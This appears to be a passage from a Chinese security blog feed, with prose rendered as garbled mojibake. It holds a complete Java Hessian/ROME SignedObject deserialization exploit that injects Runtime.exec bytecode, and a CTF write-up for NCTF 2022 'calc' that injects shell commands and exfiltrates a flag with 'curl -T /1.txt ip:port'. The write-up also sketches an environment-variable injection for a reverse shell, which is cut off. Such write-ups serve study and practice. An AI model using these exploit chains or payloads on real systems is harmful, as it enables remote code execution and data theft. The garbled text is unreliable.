class="variable">new_tables1</span> <span class="operator">=</span> tables1[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables1,<span class="string">&quot;key&quot;</span>,equalsBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = hessian2_ser(hashMap1);</span><br><span class="line">        hessian2_unser(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hessian2_ser(Object object) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(object);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hessian2_unser</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå‘ç°ä¼šæŠ¥é”™<code>NullPointerException</code>ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p>åœ¨ccé“¾ä¸­æˆ‘ä»¬çŸ¥é“<code>TemplatesImpl</code>ç±»ä¸­çš„<code>_tfactory</code>å±æ€§ç”±äºè¢«<code>transient</code>ä¿®é¥°ä»è€Œæ— æ³•è¢«åºåˆ—åŒ–ï¼Œè¿›è€Œä¼šå¯¼è‡´TemplatesImplç±»æ— æ³•è¿›è¡Œåˆå§‹åŒ–</p><p>åœ¨ccé“¾ä¸­TemplatesImplåœ¨è°ƒç”¨é‡å†™çš„readObject()æ—¶_tfactoryä¼šè¢«å®ä¾‹åŒ–</p><p><a href="https://imgse.com/i/pprrYse"><img src="https://s1.ax1x.com/2023/03/26/pprrYse.png" alt="pprrYse.png"></a></p><p>æ‰€ä»¥ä¸ä¼šå‡ºç°æŠ¥é”™ï¼Œä½†æ˜¯ç”±äºHessian2çš„ååºåˆ—åŒ–ç‰¹æ€§ä½¿å…¶æ— æ³•å¯¹_tfactoryè¿›è¡Œä¿æŠ¤ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•ç›´æ¥ä½¿ç”¨TemplatesImpl</p><p><strong>SignedObject</strong></p><p><code>SignedObject</code>åŒ…å«å¦ä¸€ä¸ª<code>Serializable</code>å¯¹è±¡ï¼ŒåŒæ—¶å…¶ååºåˆ—åŒ–çš„å†…å®¹ä¹Ÿæ˜¯å¯æ§çš„ï¼Œåœ¨SignedObjectçš„æ„é€ å‡½æ•°èƒ½åºåˆ—åŒ–ä¸€ä¸ªç±»å¹¶ä¸”å°†å…¶å­˜å‚¨åˆ°å±æ€§<code>content</code>ä¸­ï¼ŒåŒæ—¶åœ¨å…¶<code>getObject()</code>ä¸­èƒ½å¤Ÿå°†å…¶ååºåˆ—åŒ–ï¼Œæœ€é‡è¦çš„æ˜¯è¯¥æ–¹æ³•æ˜¯getter</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_SignedObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables1= (Object[]) getValue(hashMap1,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables1</span> <span class="operator">=</span> tables1[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables1,<span class="string">&quot;key&quot;</span>,equalsBean1);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap1,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean2);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables2= (Object[]) getValue(hashMap2,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables2</span> <span class="operator">=</span> tables2[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables2,<span class="string">&quot;key&quot;</span>,equalsBean2);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = hessian2_ser(hashMap2);</span><br><span class="line">        hessian2_unser(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hessian2_ser(Object object) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(object);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hessian2_unser</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pprrExU"><img src="https://s1.ax1x.com/2023/03/26/pprrExU.png" alt="pprrExU.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒæ¬¡ååºåˆ—åŒ– </tag>
            
            <tag> Hessian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›pythoné¢˜ç›®</title>
      <link href="/2023/03/13/python/"/>
      <url>/2023/03/13/python/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF-2022-calc"><a href="#NCTF-2022-calc" class="headerlink" title="[NCTF 2022]calc"></a>[NCTF 2022]calc</h1><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip,num)</span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><h2 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><p>å¯æ‰§è¡Œçš„åœ°æ–¹æœ‰ä¸¤å¤„ï¼Œevalå’Œos.systemï¼Œä½†æ˜¯evalåœ¨è¿™é‡Œè¿‡æ»¤äº†å¤ªå¤šå‡½æ•°è€Œå¯¼è‡´ä¸å¯ç”¨ï¼Œæ‰€ä»¥åªèƒ½å¯¹os.systemè¿›è¡Œåº”ç”¨ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç›´æ¥ä¼ å…¥å‘½ä»¤ï¼Œevalè§£æä¸äº†ä¼ å…¥çš„ä¸œè¥¿æ˜¯ä¼šç›´æ¥æŠ¥é”™çš„ï¼Œä»è€Œä¸ä¼šè¿›å…¥åˆ°os.systemï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å…ˆç»•è¿‡evalæŠ¥é”™</p><p>åˆ©ç”¨pythonå¤šè¡Œæ³¨é‡Šä¸‰å¼•å·<code>&#39;&#39;&#39;</code>ç»•è¿‡evalçš„æŠ¥é”™ï¼Œç”¨ <code>%0a</code> åˆ†éš”ä¸åŒå‘½ä»¤, <code>%09</code> ä»£æ›¿ç©ºæ ¼</p><p>æœ€ç»ˆæ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹æ˜¯åœ¨logå¤„ï¼Œç”¨echoæ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip,num)</span><br></pre></td></tr></table></figure><p>æ€è·¯æ˜¯å…ˆç”¨cpå°†flagå†…å®¹å¸¦è¿›ä¸€ä¸ªæ–‡ä»¶ï¼Œå†åˆ©ç”¨curlå°†å…¶å¸¦å‡ºæ¥</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/calc?num=&#x27;&#x27;&#x27;1&#x27; cp /T* /1.txt &#x27;2&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">/calc?num=&#x27;&#x27;&#x27;1&#x27; curl -T /1.txt ip:port &#x27;2&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><p>å‡ºé¢˜äººå‘ç°python3çš„systemå…·ä½“å®ç°åå‘ç°æœ€åè°ƒç”¨çš„ä½ç½®ï¼Œä¹Ÿæ˜¯é€šè¿‡<code>/bin/sh -c</code>å»æ‰§è¡Œçš„å‘½ä»¤</p><p>æ ¹æ®pç¥çš„<a href="https://tttang.com/archive/1450/">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤</a>ï¼Œæ ¸å¿ƒæ€æƒ³å°±æ˜¯é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡æ¥é€ æˆrce</p><p>è€Œåœ¨python3ä¸­ï¼Œç¯å¢ƒå˜é‡æ˜¯ä½œä¸ºå­—å…¸å‚¨å­˜çš„ï¼Œå¯ä»¥é€šè¿‡è¦†ç›–æˆ–è€…èµ‹å€¼æ¥æ§åˆ¶ï¼Œå‚è€ƒ<a href="https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">Pythoné»‘é­”æ³•â€“ç»•è¿‡ç©ºæ ¼å®ç°å˜é‡è¦†ç›– </a></p><p><a href="https://imgse.com/i/pp1SEP1"><img src="https://s1.ax1x.com/2023/03/14/pp1SEP1.png" alt="pp1SEP1.png"></a></p><p>æ‰€ä»¥é€šè¿‡è¿™ç§æ–¹å¼å»è¦†ç›–ç¯å¢ƒå˜é‡<code>os.environ</code>ï¼Œè®¾ç½®<code>os.environ[&#39;BASH_FUNC_echo%%&#39;]=&#39;() &#123; id; &#125;&#39;</code>ï¼Œè¿™æ ·å½“è°ƒç”¨<code>echo</code>å‡½æ•°çš„æ—¶å€™å°±ä¼šè§¦å‘åé¢çš„å‘½ä»¤ï¼Œç›´æ¥åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 